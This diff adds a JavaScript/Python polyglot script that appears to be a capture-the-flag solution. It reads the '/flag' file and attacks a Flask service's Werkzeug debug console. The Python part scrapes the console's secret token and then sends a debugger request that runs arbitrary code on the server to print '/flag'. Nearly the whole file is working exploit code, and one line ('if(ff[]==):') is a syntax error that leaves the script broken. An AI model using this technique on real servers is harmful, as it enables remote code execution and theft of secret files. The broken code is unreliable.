@@ -1,0 +1,34 @@
+a = 1 // 1 ; b = '''
+
+// Put your Javascript code here.
+// Python will just assign it to a string variable
+
+var fs = require('fs'); 
+var data = fs.readFileSync('/flag');
+// return(data)
+// console.log(data.toString())
+process.stdout.write(data.toString())
+
+/* '''
+# Put your Python code here. Javascript will ignore it
+# because it's inside a comment
+
+import urllib.request
+import urllib.error
+
+with urllib.request.urlopen('http://flask:5000/console') as response:
+    secret = response.read()
+secretnum = secret.decode('ascii').find('SECRET')
+secret = secret[secretnum+10:secretnum+30].decode('ascii')
+with urllib.request.urlopen('http://flask:5000/console?&__debugger__=yes&cmd=print(open(%27%2Fflag%27%2C%27r%27).read())&frm=0&s='+secret) as response:
+    console = response.read()
+
+
+ff = console.decode('ascii').split('\n')[1]
+if(ff[]==):
+	print('ddd')
+with open('/flag', 'r') as f:
+	data = f.read()
+	print(data, end = '')
+
+# */
